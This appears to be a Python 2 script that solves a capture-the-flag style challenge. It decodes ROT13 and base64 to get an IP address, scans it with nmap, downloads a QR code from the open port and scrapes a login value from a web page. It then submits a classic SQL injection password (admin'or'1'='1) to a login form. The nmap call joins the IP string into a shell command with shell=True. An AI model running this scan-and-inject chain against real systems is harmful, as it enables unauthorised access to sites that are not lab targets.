import codecs
import subprocess
from qrtools import QR
import requests
import mechanize
import base64
import socket
import webbrowser

#getting data from file
def open_file(file):
	read_data = ""

	print "Reading data ..."

	with open(file) as f:
		read_data = f.read()
	f.closed

	print "Readed data:\n" + read_data
	return read_data


#decoding ro13
def decoder(val):
	print "\n\nDecrypted data:\n" + codecs.decode(val, 'rot_13')

	return codecs.decode(val, 'rot_13')


#3.decoding base64
def base_decode(val):
	for i in val.split():
		if i.endswith('=') or i.endswith('=='):
			bs = i

	print "\n\nBase64 found: " + bs
	print "Base64 after decoding: " + base64.b64decode(bs)
	return base64.b64decode(bs)


#4.nmap -p- -T5 --reason <ip> - scanning
def scanning_port(ip):
	print "\n\nScanning of the services"
	print "It can take a while ..."

	com_f = "nmap -p1026-7069,7071-65535 "
	com_s = "| grep \"open\" | awk \'{print $1}\'"
	com = com_f + str(ip)  + com_s

	port = subprocess.check_output([com], shell=True)
	port_ret = str(port).replace('/tcp','')

	print "Port: " + port_ret

	return port_ret


#connect to port, download data and save them into file
def connect_take_data_file(ip, port):
	print "\n\nConnecting to founded port ..."
	s = socket.socket()
	p = int(port)
	s.connect((ip,p))
	datas = ""
	with open('qr-code.png', 'wb') as f:
		print 'file opened'
		while True:
			print 'receiving data ...'
			data = s.recv(1024)
			datas += data
			if not data:
				break
			f.write(data)

	f.close()
	print 'Successfully get the file'
	s.close()
	print 'connection closed'
	print 'Downloaded data:\n' + datas


#8.decoding qrcode
def read_qrcode_and_open_the_web():
	print "\n\nDecoding QR Code ..."

	qr = QR(filename = "qr-code.png")
	qr.decode()

	print "Decoded data: "
	print qr.data

	return qr.data


#10.checking source code, return commentary, return Login value
def source_code(qr_website):
	url = qr_website
	r = requests.get(url)
	ss = r.content
	webbrowser.open(url)

	sr = ""
	state = 0

	for i in ss.split():
		if i == '<!--':
			state = 1

		if i == '-->':
			state = 0

		if state == 1:
			sr = sr + " " + i

	com = "\n\nComment:\n" + sr + " -->"
	print com

	#extracting login value
	for i in com.split():
		if i.startswith("value"):
			rs = i.replace('value=\"','')


	ret = rs.replace('\"','')
	print "Your login: " + ret
	return ret


#14.user=admin;password=admin'or'1'='1
def sql_injection_attack(url, login):
	print "\n\nSQL Injection"

	print "Beginning of SQL Injection Attack ..."
	request = mechanize.Browser()
	request.open(url)
	request.select_form(nr = 0)
	request["username"] = login
	request["password"] = "admin\'or\'1\'=\'1"

	response = request.submit()
	content = response.read()

	urls = response.geturl()
	webbrowser.open(urls)


#main function
def main():
	val = open_file('rot13.txt')
	vald = decoder(val)

	ip = base_decode(vald)

	port = scanning_port(ip)
	connect_take_data_file(ip, port)

	qr_website =  read_qrcode_and_open_the_web()
	login = source_code(qr_website)

	sql_injection_attack(qr_website, login)



##############################################################
if __name__ == "__main__":
	main()
